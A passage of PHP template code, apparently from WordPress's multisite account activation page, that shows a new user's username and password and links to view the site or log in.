			$url  = isset( $result['blog_id'] ) ? get_home_url( (int) $result['blog_id'] ) : '';
			$user = get_userdata( (int) $result['user_id'] );
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>

			<div id="signup-welcome">
			<p><span class="h3"><?php _e( 'Username:' ); ?></span> <?php echo $user->user_login; ?></p>
			<p><span class="h3"><?php _e( 'Password:' ); ?></span> <?php echo $result['password']; ?></p>
			</div>

			<?php
			if ( $url && $url != network_home_url( '', 'http' ) ) :
				switch_to_blog( (int) $result['blog_id'] );
				$login_url = wp_login_url();
				restore_current_blog();
				?>
				<p class="view">
				<?php
					/* translators: 1: site URL, 2: login URL */
					printf( __( 'Your account is now activated. <a href="%1$s">View your site</a> or <a href="%2$s">Log in</a>' ), $url, esc_url( $login_url ) );
				?>
				</p>
			<?php else : ?>
				<p class="view">
				<?php
					/* translators: 1: login URL, 2: network home URL */
					printf( __( 'Your account is now activated. <a href="%1$s">Log in</a> or go back to the <a href="%2$s">homepage</a>.' ), network_site_url( 'wp-login.php', 'login' ), network_home_url() );
				?>
				</p>
				<?php
				endif;
		}
	}
	?>
	</div>
</div>
<script type="text/javascript">
	var key_input = document.getElementById('key');
	key_input && key_input.focus();
</script>
<?php
get_footer( 'wp-activate' );
